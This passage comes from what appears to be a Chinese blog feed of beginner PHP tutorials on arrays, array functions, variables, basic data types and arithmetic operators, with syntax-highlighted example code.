class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201101215705958.png#pic_center" alt="在这里插入图片描述"></p><h5 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h5><p>数据的修改也挺简单的，直接通过索引进行修改即可</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据前的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 增加数据</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ff'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据后的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 删除数组arr中的第一个数据，并输出arr当前数据</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 通过索引修改数据</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www.niubi.com'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 打印修改后的数据</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>上面每次print_r都是一次查询，跟上数据对应的下标，或者用foreach()函数来进行遍历输出即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'-->'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 或者</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$arr[$i]"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 或者</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"$k => $y &lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于数组的几个函数"><a href="#关于数组的几个函数" class="headerlink" title="关于数组的几个函数"></a>关于数组的几个函数</h3><h5 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h5><p>返回当前数组的长度：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出3（数组array的长度为3）</span><span class="token keyword">echo</span> <span class="token string">"$len"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="array-key-exists"><a href="#array-key-exists" class="headerlink" title="array_key_exists()"></a>array_key_exists()</h5><p>判断键值是否存在，返回的是一个bool值：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">'key3'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h5><p>判断值是否在里面，返回的也是bool类型的值：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">'key3'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="array-keys"><a href="#array-keys" class="headerlink" title="array_keys()"></a>array_keys()</h5><p>把数组中的键值转为索引型数组：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># array_keys()把数组的键值保存到一个索引型数组里，我这里把数组的值附给了$len</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 循环遍历$len把他的值与数据分别赋值给$key，$vla，并打印len中的值</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$vla</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'==>'</span><span class="token punctuation">.</span><span class="token variable">$vla</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的数据类型</title>
      <link href="/posts/954e9dbe.html"/>
      <url>/posts/954e9dbe.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>开始之前先来个hello world吧，顺带标记一下php的注释格式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//echo "Hello World!";</span>    <span class="token shell-comment comment">#这也是单行注释</span>    <span class="token comment" spellcheck="true">/*    这是    多行    注释    */</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030224042311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="变量的写法"><a href="#变量的写法" class="headerlink" title="变量的写法"></a>变量的写法</h3><p>变量名：<strong>必须以$符开头</strong><br>变量名组成部分：a-z A-Z 0-9 下划线，<strong>但是不能以数字开头！</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>变量区分大小写</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 运行会输出10</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在学习变量类型前需要学习三个函数，为了方便我们了解变量类型。</p><h3 id="输出变量类型的函数"><a href="#输出变量类型的函数" class="headerlink" title="输出变量类型的函数"></a>输出变量类型的函数</h3><h5 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030225419944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>现在我们来测试一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020103022572954.png#pic_center" alt="在这里插入图片描述"><br>这里可以看到，程序只输出了1，其实它返回了两个值，一个1，一个NULL，为了更好的观察它的返回值，我们在这里使用另一个函数var_dump</p><h5 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020103023024289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>现在我们来看一下添加了var_dump()函数后的程序输出怎样的结果：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// echo isset($b);</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030232954733.png#pic_center" alt="在这里插入图片描述"></p><p>最后来一个gettype()，查询变量的类型</p><h5 id="gettype"><a href="#gettype" class="headerlink" title="gettype()"></a>gettype()</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030233234328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">用法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token number">21.2</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'张三'</span><span class="token punctuation">;</span>    <span class="token variable">$B</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// echo isset($a);</span>    <span class="token comment" spellcheck="true">// // echo isset($b);</span>    <span class="token comment" spellcheck="true">// var_dump(isset($b))</span>    <span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$B</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020103023452596.png#pic_center" alt="在这里插入图片描述"></p><h3 id="PHP的五个基本数据类型"><a href="#PHP的五个基本数据类型" class="headerlink" title="PHP的五个基本数据类型"></a>PHP的五个基本数据类型</h3><h5 id="字符串（string）"><a href="#字符串（string）" class="headerlink" title="字符串（string）"></a>字符串（string）</h5><ul><li>字符串要用<strong>双引号</strong>或者<strong>单引号</strong>括住，中间可以加html标签</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$number</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'xiaoming jin nian $number sui le ~&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"xiaoming jin nian $number sui le ~"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><ol><li>用<strong>单引号</strong>时，程序不会对字符串进行解析，如果包含变量，只会输出变量名，而不会输出变量值</li><li>用<strong>双引号</strong>时则会对字符串进行解析，如果包含变量，则会对变量进行解析，输出变量值</li><li>当一个字符串是纯文本组成时，尽量用单引号输出<h5 id="整数（intger）"><a href="#整数（intger）" class="headerlink" title="整数（intger）"></a>整数（intger）</h5></li></ol><p>例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="浮点数（float）"><a href="#浮点数（float）" class="headerlink" title="浮点数（float）"></a>浮点数（float）</h5><p>浮点数是<strong>带小数点</strong>或者<strong>指数类型</strong>的数字</p><pre class="line-numbers language-php"><code class="language-php">count <span class="token operator">=</span> <span class="token number">66.66</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h5><p>只有两个值<strong>TRUE</strong>或<strong>FALSE</strong> 常用于条件测试，例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$login</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h5><p>字面意思，表示为空</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$number</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$login</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token variable">$null</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">,</span><span class="token variable">$login</span><span class="token punctuation">,</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//打印当前变量类型</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201009114034554.png#pic_center" alt="在这里插入图片描述"></p><h3 id="PHP的运算符"><a href="#PHP的运算符" class="headerlink" title="PHP的运算符"></a>PHP的运算符</h3><h5 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201009114252736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这个敲一敲就行了，比较简单：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//定义变量x，y并赋值</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进行加减乘除运算并输出结果</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-</span><span class="token 